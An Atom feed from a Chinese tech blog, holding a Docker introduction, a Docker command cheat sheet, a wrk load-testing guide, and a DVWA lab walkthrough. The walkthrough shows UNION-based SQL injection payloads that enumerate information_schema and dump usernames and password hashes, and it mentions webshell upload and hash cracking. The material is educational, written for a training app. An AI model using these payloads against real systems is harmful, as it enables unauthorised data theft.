<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2016-11-22T03:18:00.381Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker初体验-基础入门指北</title>
    <link href="https://t1ger.github.io/2016/11/21/Docker%E5%88%9D%E4%BD%93%E9%AA%8C-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"/>
    <id>https://t1ger.github.io/2016/11/21/Docker初体验-基础入门指北/</id>
    <published>2016-11-21T10:08:35.000Z</published>
    <updated>2016-11-22T03:18:00.381Z</updated>
    
    <content type="html"><![CDATA[<h4 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a><b>docker是什么</b></h4><p>docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
<h4 id="docker做什么"><a href="#docker做什么" class="headerlink" title="docker做什么"></a><b>docker做什么</b></h4><p>在docker中，你可以将你的程序分为不同的基础部分，对于每一个基础部分都可以当做一个应用程序来管理<br>docker能够帮助你快速地测试、快速地编码、快速地交付，并且缩短你从编码到运行应用的周期<br>docker使用轻量级的容器虚拟化平台，并且结合工作流和工具，来帮助你管理、部署你的应用程序</p>
<h4 id="docker-vs-VM"><a href="#docker-vs-VM" class="headerlink" title="docker vs VM"></a><b>docker vs VM</b></h4><p>VMs = Server + Host OS + Hypervisor（Type2）+ Guest OS + Bins/Libs +(App A | App A’ | App B)<br>Containers = Server + Host OS + Docker Engine + ((Bins/Libs +App A | App A’) | (Bins/Libs +App B))<br>Docker去除了传统虚机的Guest OS层，免除了对应overhead，Docker Engine 替代了VM中的Guest OS + Hypervisor（Type2)层</p>
<h4 id="docker架构"><a href="#docker架构" class="headerlink" title="docker架构"></a><b>docker架构</b></h4><p>docker是CS架构，主要由下面三部分组成：<br>docker daemon: 运行在宿主机上，docker守护进程，用户通过docker client(docker命令)与docker daemon交互<br>docker client: docker 命令行工具，是用户使用docker的主要方式，docker client与docker daemon通信并将结果返回给用户，docker client也可以通过socket或者RESTful api访问远程的docker daemon<br>docker hub/registry: 共享和管理docker镜像，用户可以上传或者下载上面的镜像，官方地址为 <a href="https://registry.hub.docker.com" target="_blank" rel="external">https://registry.hub.docker.com</a> ,也可以搭建自己私有的docker registry</p>
<h4 id="docker技术术语"><a href="#docker技术术语" class="headerlink" title="docker技术术语"></a><b>docker技术术语</b></h4><p>docker的几个技术：namespace,cgroups,veth,bridge,copy-on-write,image,container<br>其中namespace和cgroup是其核心技术,我们主要来介绍这两个</p>
<h4 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a><b>namespace</b></h4><p>负责隔离资源，它让进程拥有独立的进程号，网络，文件系统等，不同的namespace下的进程互不可见，目前的Docker可以通过exec子命令直接切换到进程所在的namespace<br>docker使用到的命名空间有:</p>
<ul>
<li>pid命名空间: 使用在进程隔离(PID: Process ID)</li>
<li>net命名空间: 使用在管理网络接口(NET: Networking)</li>
<li>ipc命名空间: 使用在管理进程间通信资源 (IPC: InterProcess Communication)</li>
<li>mnt命名空间: 使用在管理挂载点 (MNT: Mount)</li>
<li>uts命名空间: 使用在隔离内核和版本标识 (UTS: Unix Timesharing System)</li>
</ul>
<h4 id="cgroups"><a href="#cgroups" class="headerlink" title="cgroups"></a><b>cgroups</b></h4><p>cgroup负责限制资源,主要体现在cpu、内存、磁盘</p>
<p><b>CPU子系统</b><br>cgroups提供了三种限制CPU资源的方式：cpuset， cpuquota和cpushares</p>
<ul>
<li><p>cpuset可以限制进程使用的cpu核数，通过cpuset/cpuset.cpus来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpuset-cpus 0 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpuquota以时间片的使用率来限制CPU资源，要比cpuset的细粒度大一些，只需要设置一个相对100000的值就可以达到限制一个百分比的效果, 通过 cpu/cpu.cfs_period_us （配置时间片单位，默认为100000）和 cpu/cpu.cfs_quota_us (时间片占比)两个文件来管理,相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-quota 50000 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpushares根据权重来分配CPU资源，比如如果只有一个进程权重为100，那么进程可以使用100%的CPU资源，如果有两个进程且权重都是100，那么每个进程可以使用50%的CPU资源 , 通过 cpu/cpu.shares 来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-shares 1024 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>内存子系统</b></p>
<ul>
<li>cgroups对内存的限制包括物理内存和swap，当进程使用内存达到上限时会被kill，关于内存限制的文件如下：<br>memory.limit_in_bytes memory.soft_limit_in_bytes memory.memsw.limit_in_byte,需要注意的一点是docker默认会将swap的限制设置为2倍内存，实际使用的内存可能会大于 -m 设置的内存大小,相应的docker命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -m 100m -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>blkio子系统</b></p>
<ul>
<li>blkio子系统的功能是对块设备读写的速率限制,目前 blkio 子系统提供的两种控制策略，一个是权重比例方式的控制，另一个是针对 IO 带宽和 IOPS 的控制.前者是针对blkio.weight 分配权重，后者对blkio.throttle.write_iops_device 进行限制。</li>
</ul>
<p>ref </p>
<p><a href="https://www.baidu.com/link?url=ubhv7epUUNTpytivc7_ikrYX-flsGZHW9gn0REl9273xJa2YpM3kLz2wR6BqkCSMjYMZrXuyJlXQjU1bil4uja&amp;wd=&amp;eqid=e8f57cc000011018000000025833b49b" target="_blank" rel="external">Docker 百度百科</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      how to use docker quickly
    
    </summary>
    
    
      <category term="docker" scheme="https://t1ger.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>dvwa平台测试sql注入</title>
    <link href="https://t1ger.github.io/2016/11/20/dvwa%E5%B9%B3%E5%8F%B0%E6%B5%8B%E8%AF%95sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://t1ger.github.io/2016/11/20/dvwa平台测试sql注入/</id>
    <published>2016-11-20T03:28:59.000Z</published>
    <updated>2016-11-20T05:58:44.255Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。<br>本文所有演示操作都是在此环境中,本文是帮助用户了解信息安全技术、安全漏洞相关信息，不承担任何法律及连带责任</p>
<p>我们的测试环境：<br>测试平台：dvwa<br>渗透工具推荐：burpsuite<br>本次测试主要针对mysql数据库，针对不同的数据库平台，注入语句需要做相应更改</p>
<p>首先，我们此次测试的安全等级为low，先让自己有点信心吗，免的一上来就被打脸</p>
<p>sql注入利用一般有以下几个基本步骤:</p>
<ul>
<li>发现sql注入点</li>
<li>通过mysql数据库帮助，获取账户密码等敏感信息</li>
<li>上传webshell,获得一个反向链接</li>
</ul>
<p>闲言少叙，赶紧开始吧</p>
<p>一般我们先登入dvwa平台，选择Sql Injection选项，有的同学要说了，用户密码是什么呀？这个。。。，其实找个暴力破解工具解决了，如果不行问问谷歌也可以哈<br>这里我们看到一个输入框，提示我们输入用户id,这里我们输入数字1，提交后返回了用户1的信息<br>它一共返回三行数据<br>一行是我们输入的用户ID。一行是用户名，另外一行是用户别名。同时，看一下浏览器的地址栏那里，发现url成这样了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a></p>
<p>接下来我们输入2,发现url变成了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</a></p>
<p>接下来我们输入“’”时，页面提示错误“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1”，结果如图。看到这个结果，我们可以欣慰的知道，这个表单存在着注入漏洞。<br>之所以产生错误是因为，输入的用户ID中,单引号不是一个整数类型的，导致后端SQL查询产生了错误，可以想象一下后端SQL查询语句大概是这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;select first_name,last_name from users where user_id=”;</div></pre></td></tr></table></figure>
<p>在我们输入“’”后，sql语句就会变成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MySQL&gt; select first_name, last_name from users where user_id=”’ ;</div></pre></td></tr></table></figure></p>
<p>好了，到这里，我们可以得出这里传进去的id的值是我们可以控制的。前端的该语句是会在后端的sql服务器进行执行的，这将使sql注入变为可能</p>
<p>在我们确认了漏洞之后，就可以构造payload了。什么是payload?说白了就是一段恶意代码，以便我们能够获得数据库里面的数据。<br>我们需要确定表里边有几个字段，常用的方法有两种</p>
<ul>
<li>用order by 语句</li>
<li>用union select </li>
</ul>
<p>分析字段数的原因是我们之后需要用union select 语句获得我们需要的敏感数据。<br>由order by 语法知道，要是后面跟着的数字超出了字段数时，就会报错<br>我们构造的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; order by 1#</div><div class="line">1&apos; order by 2#</div><div class="line">1&apos; order by 3#</div></pre></td></tr></table></figure></p>
<p>当输入到3的时候，发现它报错了，也就是说字段数为2。</p>
<p>当用union select 猜测的时候也是一样，当字段数不对应的时候，它也是会发生报错的，这里直接贴出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; union select 1#</div><div class="line">1&apos; union select 1,2#</div><div class="line">1&apos; union select 1,2,3#</div></pre></td></tr></table></figure></p>
<p>准备工作都做好了，那我们开始获取数据库的敏感信息了：获取当前数据库名和用户名，构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos; union select database(),user()#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: admin</div><div class="line">Surname: admin</div><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: dvwa</div><div class="line">Surname: admin@localhost</div></pre></td></tr></table></figure></p>
<p>我们可以看到当前使用的数据库为：dvwa，当前的用户名：root@localhost。<br>类似的函数还有：version() 获取当前数据库版本,@@version_compile_os获取当前操作系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select version(),@@version_compile_os#</div></pre></td></tr></table></figure></p>
<p>光获得这些信息有什么用呢，慢慢听我道来<br>我们知道mysql有个information_schema，这是一个包含了mysql数据库所有信息的“字典”，本质上还是一个database，存放着其他各个数据的信息<br>在information_schema里，有一个表tables。有一个columns……是不是有点感觉了？ tables这个表存放的是关于数据库中所有表的信息，里面有个字段叫table_name，还有个字段叫做table_schema。其中table_name是表名，table_schema表示的是这个表所在的数据库。对于columns，它有column_name，table_schema，table_name。回想一下，我们拥有的信息是数据库名。也就是说我们可以构造这样的payload来从数据库里获取一些东西。</p>
<p>构造的查询语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: guestbook</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: users</div><div class="line">Surname: 2</div></pre></td></tr></table></figure></p>
<p>出来两个表，对那个感兴趣呢？？？当然是users表啦！不是说还有一个columns表么？所以我们还需要table_name以及table_schema来查column_name。这次我们构造的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user_id</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: first_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: last_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: password</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: avatar</div><div class="line">Surname: 2</div></pre></td></tr></table></figure>
<p>这么多数据，选哪个呢？？？废话，当然是user，password啦。我们再次修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select user,password from users#</div></pre></td></tr></table></figure></p>
<p>终于返回我们想看的数据了，不过貌似密码是md5加密过的，这能难倒我们么，找度娘帮忙，找一些破解md5值的网站来进行破解<br>之后返回登陆界面验证下</p>
<p>简单的SQL注入就说到这儿了，下次我们将进行DVWA里面的中级SQL注入</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。&lt;br&gt;本文所有演示
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>http压力测试工具wrk</title>
    <link href="https://t1ger.github.io/2016/11/19/http%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7wrk/"/>
    <id>https://t1ger.github.io/2016/11/19/http压力测试工具wrk/</id>
    <published>2016-11-19T08:56:36.000Z</published>
    <updated>2016-11-19T09:51:58.379Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>wrk是一款开源的压力测试工具，它没有Load Runner那么复杂，和apache的ab 一样简单上手，确比ab功能更加强大，足以应对开发过程中的性能验证了：</p>
<ul>
<li>集成了多线程设计和事件通知系统(epoll,kqueue)</li>
<li>通过lua脚本进行扩展 eg. http请求的生产、响应处理，自定义报告等</li>
</ul>
<p>下载安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># git clone https://github.com/wg/wrk.git</div><div class="line"># cd wrk/</div><div class="line"># make -j8</div><div class="line"># ./wrk  -t12 -c100 -d10s http://www.baidu.com</div></pre></td></tr></table></figure></p>
<p>要测试的网站当然是百度了，据说百度是局域网看网络通不通的首选哦，没有之一<br>我们启动 12 个线程，100 个并发，持续运行 10 秒。线程数一般设置为cpu核数的2-4倍,如果想看响应时间的分布情况可以加上–latency参数</p>
<p>[root@localhost wrk]# ./wrk  -t12 -c100 -d10s <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a><br>Running 10s test @ <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a><br>  12 threads and 100 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency   367.77ms  417.94ms   1.97s    84.84%<br>    Req/Sec     9.79      6.43    40.00     65.23%<br>  760 requests in 10.12s, 11.42MB read<br>  Socket errors: connect 0, read 0, write 0, timeout 41<br>Requests/sec:     75.13<br>Transfer/sec:      1.13MB</p>
<p>Latency: 可以理解为响应时间, 有平均值, 标准偏差, 最大值, 正负一个标准差占比<br>Requests/sec 就是最基本的指标：每秒处理的请求数(QPS)<br>Thread Stats 是线程执行情况，包括延迟、每秒处理个数，其中的 Avg 和 Max 很好理解，是平均值和最大值，Stdev 是标准差。<br>一般我们来说我们主要关注平均值和最大值. 标准差如果太大说明样本本身离散程度比较高. 有可能系统性能波动很大</p>
<p>测试场景-Post<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># cat post.lua</div><div class="line">wrk.method = &quot;POST&quot;  </div><div class="line">wrk.body   = &quot;foo=bar&amp;baz=quux&quot;  </div><div class="line">wrk.headers[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;  </div><div class="line"></div><div class="line"># ./wrk -t12 -c100 -d30s -T30s --script=post.lua --latency http://www.baidu.com</div></pre></td></tr></table></figure></p>
<p>复合场景-lua 实现访问多个 url.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">counter = 1</div><div class="line"></div><div class="line">math.randomseed(os.time())</div><div class="line">math.random(); math.random(); math.random()</div><div class="line"></div><div class="line">function file_exists(file)</div><div class="line">  local f = io.open(file, &quot;rb&quot;)</div><div class="line">  if f then f:close() end</div><div class="line">  return f ~= nil</div><div class="line">end</div><div class="line"></div><div class="line">function shuffle(paths)</div><div class="line">  local j, k</div><div class="line">  local n = #paths</div><div class="line">  for i = 1, n do</div><div class="line">    j, k = math.random(n), math.random(n)</div><div class="line">    paths[j], paths[k] = paths[k], paths[j]</div><div class="line">  end</div><div class="line">  return paths</div><div class="line">end</div><div class="line"></div><div class="line">function non_empty_lines_from(file)</div><div class="line">  if not file_exists(file) then return &#123;&#125; end</div><div class="line">  lines = &#123;&#125;</div><div class="line">  for line in io.lines(file) do</div><div class="line">    if not (line == &apos;&apos;) then</div><div class="line">      lines[#lines + 1] = line</div><div class="line">    end</div><div class="line">  end</div><div class="line">  return shuffle(lines)</div><div class="line">end</div><div class="line"></div><div class="line">paths = non_empty_lines_from(&quot;paths.txt&quot;)</div><div class="line"></div><div class="line">if #paths &lt;= 0 then</div><div class="line">  print(&quot;multiplepaths: No paths found. You have to create a file paths.txt with one path per line&quot;)</div><div class="line">  os.exit()</div><div class="line">end</div><div class="line"></div><div class="line">print(&quot;multiplepaths: Found &quot; .. #paths .. &quot; paths&quot;)</div><div class="line"></div><div class="line">request = function()</div><div class="line">    path = paths[counter]</div><div class="line">    counter = counter + 1</div><div class="line">    if counter &gt; #paths then</div><div class="line">      counter = 1</div><div class="line">    end</div><div class="line">    return wrk.format(nil, path)</div><div class="line">end</div></pre></td></tr></table></figure>
<p>场景-cookie<br>我们需要模拟一些通过 cookie 传递数据的场景. wrk 并没有特殊支持, 可以通过 wrk.headers[“Cookie”]=”xxxxx”实现. 例子是取 Response的cookie作为后续请求的cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function getCookie(cookies, name)</div><div class="line">  local start = string.find(cookies, name .. &quot;=&quot;)</div><div class="line"></div><div class="line">  if start == nil then</div><div class="line">    return nil</div><div class="line">  end</div><div class="line"></div><div class="line">  return string.sub(cookies, start + #name + 1, string.find(cookies, &quot;;&quot;, start) - 1)</div><div class="line">end</div><div class="line"></div><div class="line">response = function(status, headers, body)</div><div class="line">  local token = getCookie(headers[&quot;Set-Cookie&quot;], &quot;token&quot;)</div><div class="line">  </div><div class="line">  if token ~= nil then</div><div class="line">    wrk.headers[&quot;Cookie&quot;] = &quot;token=&quot; .. token</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure>
<p>通过源码可以看到 wrk 对象的源代码有如下属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">local wrk = &#123;</div><div class="line">   scheme  = &quot;http&quot;,</div><div class="line">   host    = &quot;localhost&quot;,</div><div class="line">   port    = nil,</div><div class="line">   method  = &quot;GET&quot;,</div><div class="line">   path    = &quot;/&quot;,</div><div class="line">   headers = &#123;&#125;,</div><div class="line">   body    = nil,</div><div class="line">   thread  = nil,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>schema, host, port, path 这些, 我们一般都是通过 wrk 命令行参数来指定,wrk 还提供了几个lua的hook函数：<br>setup //在目标 IP 地址已经解析完, 并且所有 thread 已经生成, 但是还没有开始时被调用. 每个线程执行一次这个函数.可以通过thread:get(name),  thread:set(name, value)设置线程级别的变量<br>init  //每次请求发送之前被调用<br>delay //返回一个数值, 在这次请求执行完以后延迟多长时间执行下一个请求. 可以对应 thinking time 的场景<br>request  //函数可以每次请求之前修改本次请求的属性. 返回一个字符串. 这个函数要慎用, 会影响测试端性能<br>response //每次请求返回以后被调用. 可以根据响应内容做特殊处理, 比如遇到特殊响应停止执行测试, 或输出到控制台等等<br>done   //在所有请求执行完以后调用, 一般用于自定义统计结果</p>
<p>已经迫不及待了吧，让我们看看源码给的例子吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">local counter = 1</div><div class="line">local threads = &#123;&#125;</div><div class="line"></div><div class="line">function setup(thread)</div><div class="line">   thread:set(&quot;id&quot;, counter)</div><div class="line">   table.insert(threads, thread)</div><div class="line">   counter = counter + 1</div><div class="line">end</div><div class="line"></div><div class="line">function init(args)</div><div class="line">   requests  = 0</div><div class="line">   responses = 0</div><div class="line"></div><div class="line">   local msg = &quot;thread %d created&quot;</div><div class="line">   print(msg:format(id))</div><div class="line">end</div><div class="line"></div><div class="line">function request()</div><div class="line">   requests = requests + 1</div><div class="line">   return wrk.request()</div><div class="line">end</div><div class="line"></div><div class="line">function response(status, headers, body)</div><div class="line">   responses = responses + 1</div><div class="line">end</div><div class="line"></div><div class="line">function done(summary, latency, requests)</div><div class="line">   for index, thread in ipairs(threads) do</div><div class="line">      local id        = thread:get(&quot;id&quot;)</div><div class="line">      local requests  = thread:get(&quot;requests&quot;)</div><div class="line">      local responses = thread:get(&quot;responses&quot;)</div><div class="line">      local msg = &quot;thread %d made %d requests and got %d responses&quot;</div><div class="line">      print(msg:format(id, requests, responses))</div><div class="line">   end</div><div class="line">end</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/wg/wrk" target="_blank" rel="external">wrk 官网</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;wrk是一款开源的压力测试工具，它没有Load Runner那么复杂，和apache的ab 一样简单上手，确比ab功能更加强大，足以应对开发过程中的性能验证了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成了多线程设计和事件通知系统(epoll,kqueue)&lt;/li&gt;
&lt;l
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker日常命令</title>
    <link href="https://t1ger.github.io/2016/11/19/docker%E6%97%A5%E5%B8%B8%E5%91%BD%E4%BB%A4/"/>
    <id>https://t1ger.github.io/2016/11/19/docker日常命令/</id>
    <published>2016-11-19T05:35:24.000Z</published>
    <updated>2016-11-19T05:59:18.166Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>启动容器并启动bash(交互)：<br>docker run -i -t <image_name container_id=""> /bin/bash</image_name></p>
</li>
<li><p>启动容器以后台方式运行<br>docker run -d -it <image_name container_id=""></image_name></p>
</li>
<li><p>启动容器并映射对外端口<br>docker run -p <host_ip>:<container_ip> <image> <cmd><br>docker run -d -p 80:80 -p 2003:2003 -p 8125:8125/udp -p 8126:8126 –name jlachowski-grafana-dashboard jlachowski/grafana-graphite-statsd</cmd></image></container_ip></host_ip></p>
</li>
</ul>
<ul>
<li><p>进入容器，同时运行bash<br>docker exec -t -i <id container_name=""> /bin/bash</id></p>
</li>
<li><p>查看容器日志和实时输<br>docker logs <id container_name=""><br>docker logs -f <id container_name=""></id></id></p>
</li>
<li><p>查看当前运行的container<br>docker ps<br>docker ps |less -S </p>
</li>
<li><p>显示容器的进程信息<br>docker top id/container_name</p>
</li>
<li><p>在容器中安装新程序<br>docker run image_name yum install packagename -y</p>
</li>
<li><p>从容器拷贝文件/目录到本地路径<br>docker cp <id container_name="">:/container_path to_path</id></p>
</li>
<li><p>保存对容器的修改<br>docker commit id new_image_name</p>
</li>
<li><p>删除单个或所有<br>docker rm id/container_name<br>docker rm `docker ps -a -q`</p>
</li>
<li><p>停止、启动、杀死、重启容器<br>docker <stop id="" start="" kill="" restart=""></stop>  id/container_name</p>
</li>
</ul>
<ul>
<li>操作镜像<br>docker images //列出<br>docker search images //搜索<br>docker pull image_name // 下载<br>docker rmi image_name  // 删除一个或多个<br>docker history image_name //镜像历史<br>docker push new_image_name //发布镜像</li>
</ul>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
